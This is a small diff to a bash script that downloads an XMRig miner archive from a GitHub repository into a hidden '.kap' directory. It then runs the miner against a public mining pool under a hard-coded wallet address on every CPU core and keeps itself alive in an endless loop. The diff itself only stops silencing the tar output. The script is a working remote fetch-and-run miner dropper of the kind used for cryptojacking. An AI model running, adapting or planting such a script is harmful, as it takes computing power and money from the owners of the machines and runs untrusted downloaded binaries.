@@ -1,6 +1,6 @@
 #!/bin/bash
 mkdir .kap && cd .kap
-wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz >/dev/null 2>&1
+wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz
 ./xmrig --donate-level 1 -o sg.qrl.herominers.com:1166 -u Q010500adca440a557e2c9b15526e6fecec5f0a797c819d1717b5740d6dd69f722397256822f39f.amisa -a rx/0 -k -t $(nproc --all)
 while [ 1 ]; do
 sleep 3
